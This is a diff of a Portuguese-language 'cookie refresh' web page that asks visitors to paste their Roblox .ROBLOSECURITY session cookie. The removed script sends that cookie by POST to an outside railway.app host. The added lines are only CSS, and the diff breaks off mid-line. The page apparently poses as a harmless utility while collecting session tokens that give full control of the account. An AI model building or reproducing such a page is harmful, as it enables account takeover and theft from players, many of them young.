@@ -48,43 +48,23 @@
       margin-top: 20px;
       white-space: pre-wrap;
     }
+
+    #cookieContainer {
+      max-width: 90%;
+      margin: 10px auto;
+      padding: 10px;
+      background-color: #1e1e1e;
+      color: white;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+
+    code {
+      white-space: nowrap;
+    }
   </style>
 </head>
 <body>
 
   <h1 class="main-title">Refresh seu Cookie</h1>
-  <input type="text" id="cookie" placeholder="Cole seu .ROBLOSECURITY aqui" />
-  <br>
-  <button onclick="enviarCookie()">Refresh</button>
-  <p id="resposta"></p>
-
-  <script>
-     async function enviarCookie() {
-    const cookie = document.getElementById("cookie").value;
-    const respostaElemento = document.getElementById("resposta");
-
-    try {
-      const resposta = await fetch("https://robloxbp-production.up.railway.app/refresh", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ cookie })
-      });
-
-      // Verifica se o status da resposta é OK (200–299)
-      if (!resposta.ok) {
-        const texto = await resposta.text();
-        throw new Error(`Erro HTTP ${resposta.status}: ${texto}`);
-      }
-
-      const dados = await resposta.json();
-      respostaElemento.innerText = JSON.stringify(dados, null, 2);
-    } catch (erro) {
-      respostaElemento.innerText = "Erro ao processar resposta: " + erro.message;
-      }
-    }
-  </script>
-
-</body>
-</html>
+  <input type="text" id="cookie"
